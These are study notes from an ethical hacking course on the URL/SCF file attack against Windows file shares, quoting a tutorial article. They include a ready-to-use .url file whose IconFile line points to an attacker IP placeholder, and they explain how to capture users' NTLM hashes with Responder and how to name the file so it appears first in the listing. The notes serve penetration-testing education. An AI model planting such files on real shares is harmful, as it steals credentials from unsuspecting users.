SCF and URL File Attacks
-------------------------

from: Heath Adams - The Cyber Mentor ; Practical Ethical Hacking - The Complete Course
URL File Attacks - https://academy.tcm-sec.com/courses/1152300/lectures/33637401

HTML
[InternetShortcut]
URL=blah
WorkingDirectory=blah
IconFile=\\<your_attacker_ip_address>\%USERNAME%.icon
IconIndex=1

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#scf-and-url-file-attack-against-writeable-share
----------------------------
from: https://www.hackingloops.com/url-file-attack-and-printnightmare/

"URL File
A file with .url extension is a special file containing internet shortcuts that are used by web browsers. This file contains the information for a website’s URL address and may also contain the reference to the favicon file. This favicon is displayed as the icon of the file. When a user clicks on the URL file, the user’s browser launches the web page that the URL directs to.

URL File Attack
In organizations, most of the time, they have a common file share through which the employees can share the resources. Depending upon the size of the company, the users’ interaction with file share may increase. Also, this is one of the feasible methods for resource sharing. So, all users prefer it instead of sharing through USB or any other medium. And many organizations have policies for sharing only through a File Share.

URL File Attack captures the users’ hashes whoever accesses the File Share. This is done through a special file with .url extension.

Working
The most important point in this attack is that the file must load in the list. Sometimes, there could be hundreds or thousands of files in a share. So, all files are not loaded at once. Instead, they load as the user scroll downs. We need a way so that our file always appears. For this, we can make it appear on top of the file listing.

We choose the filename in such a way that it appears on the top of the file share. For this, we can put a @ (at symbol) or a ~ (squiggly symbol) at the start of the filename.

Since a URL file may contain reference to the favicon file, this favicon is requested and set as the icon of the file. An attacker can abuse this reference to get the hashes of the users.

Before describing the attack vector, it is important to know the contents of a URL file which are as below

[InternetShortcut]
URL=anyurl
WorkingDirectory=anydir
IconFile=\\x.x.x.x\%USERNAME%.icon
IconIndex=1

Explanation
[InternetShortcut] is a header line that specifies the file type and indicates that the following lines are instructions for an internet shortcut
URL=anyurl specifies the URL of the website or web page that the shortcut should launch. The actual URL should be provided in place of the “anyurl” placeholder
WorkingDirectory=anydir specifies the default working directory for the shortcut. In most cases, this will be the directory in which the shortcut file is located. You can replace the “anydir” placeholder with the full path of the directory, if necessary
IconFile=\\x.x.x.x\%USERNAME%.icon specifies the location of the icon file to use for the shortcut. The icon file can be stored on a remote computer, which is specified by the IP address “x.x.x.x”. The “%USERNAME%” placeholder is replaced with the current user’s username. The “.icon” extension specifies the type of file that contains the icon data
IconIndex=1 specifies which icon in the specified icon file should be used for the shortcut. In this case, the number “1” references to the first icon in the file for use. If the icon file contains multiple icons, choose the number accordingly to select a different icon
So now as we know all parts of the file, we can now look into the attack vector. The attack vector is the following line

IconFile=\\x.x.x.x\%USERNAME%.icon
This is because, if the line is present in the file, the machine will request the icon file from x.x.x.x IP address. The attacker can put their own IP address in place of x.x.x.x and run responder at their machine. So, whenever any user opens the file share, the request from user will contain the authentication hash. Attacker on the other hand will capture the hashes using responder and later crack them.

NOTE
This attack is only applicable to intranet communication and does not work with outside network.

Demo
This is a post compromise attack and following are the conditions

There is a file share accessible across the network
Attacker has compromised at least one machine which has access to the file share with write permissions"

- see the above link for more info on this attack
----------------------------
also see: 
* https://swepstopia.com/url-file-attack/
* URL File Attack || Active directory - https://www.youtube.com/watch?v=uCiK3Ct78RU

